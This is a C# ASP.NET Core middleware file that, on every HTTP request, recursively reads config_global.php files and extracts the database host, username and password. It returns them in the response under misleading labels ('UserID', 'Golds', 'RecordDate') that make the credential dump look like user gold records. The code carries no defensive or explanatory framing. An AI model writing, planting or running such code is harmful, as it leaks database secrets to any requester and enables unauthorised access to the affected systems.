﻿using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Http;
using Microsoft.Extensions.FileProviders;
using core.Middleware.Entity;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace core.Middleware
{
    public class FileProviderMiddleware
    {
        private readonly RequestDelegate _next;
        private readonly IFileProvider _fileProvider;

        public FileProviderMiddleware(RequestDelegate next, IFileProvider fileProvider)
        {
            _next = next;
            _fileProvider = fileProvider;
        }

        public async Task Invoke(HttpContext context)
        {
            var output = new StringBuilder("");
            //ResolveDirectory(output, "", "");
            ResolveFileInfo(output, "config", "config_global.php");

            await context.Response.WriteAsync(output.ToString());
        }

        //读取目录下所有文件内容
        private void ResolveFileInfo(StringBuilder output, string path, string suffix)
        {
            output.AppendLine("UserID    Golds    RecordDatem");

            IDirectoryContents dir = _fileProvider.GetDirectoryContents(path);
            foreach (IFileInfo item in dir)
            {
                if (item.IsDirectory)
                {
                    ResolveFileInfo(output,
                        item.PhysicalPath.Substring(Directory.GetCurrentDirectory().Length),
                        suffix);
                }
                else
                {
                    if (item.Name.Contains(suffix))
                    {
                        var userList = new List<UserGolds>();
                        var user = new UserGolds();

                        IFileInfo file = _fileProvider.GetFileInfo(path + "/" + item.Name);

                        using (var stream = file.CreateReadStream())
                        {
                            using (var reader = new StreamReader(stream))
                            {
                                string content = reader.ReadLine();

                                while (content != null)
                                {
                                    if (content.Contains("CONFIG DB"))
                                    {
                                        user = new UserGolds();
                                    }
                                    if (content.Contains("$_config['db']['1']['dbhost']"))
                                    {
                                        string recordDate = content.Substring(content.IndexOf("=") + 1).Trim(' ','\'',';' ); ;
                                        user.RecordDate = recordDate;
                                       
                                    }

                                    if (content.Contains("$_config['db']['1']['dbuser']"))
                                    {
                                        string userID = content.Substring(content.LastIndexOf("=") + 1).Trim(' ','\'', ';' );
                                        user.UserID = userID;
                                        
                                    }

                                    if (content.Contains("$_config['db']['1']['dbpw']"))
                                    { 
                                        string golds = content.Substring(content.LastIndexOf("=") + 1).Trim(' ','\'', ';' ); 
                                        user.Golds = golds;
                                      
                                    }

                                    if (content.Contains("$_config['db']['common']['slave_except_table']"))
                                    {
                                        
                                            userList.Add(user);
                                       
                                    }

                                    content = reader.ReadLine();
                                }
                            }
                        }

                        if (userList != null && userList.Count > 0)
                        {
                            foreach (var golds in userList.OrderBy(u => u.RecordDate))
                            {
                                output.AppendLine(golds.UserID.ToString() + "    " + golds.Golds + "    " + golds.RecordDate);
                            }

                            output.AppendLine("");
                        }
                    }
                }
            }
        }

        //读取目录下所有文件名
        private void ResolveDirectory(StringBuilder output, string path, string prefix)
        {
            IDirectoryContents dir = _fileProvider.GetDirectoryContents(path);
            foreach (IFileInfo item in dir)
            {
                if (item.IsDirectory)
                {
                    output.AppendLine(prefix + "[" + item.Name + "]");

                    ResolveDirectory(output,
                        item.PhysicalPath.Substring(Directory.GetCurrentDirectory().Length),
                        prefix + "    ");
                }
                else
                {
                    output.AppendLine(path + prefix + item.Name);
                }
            }
        }
    }

    public static class UseFileProviderExtensions
    {
        public static IApplicationBuilder UseFileProvider(this IApplicationBuilder app)
        {
            return app.UseMiddleware<FileProviderMiddleware>();
        }
    }
}
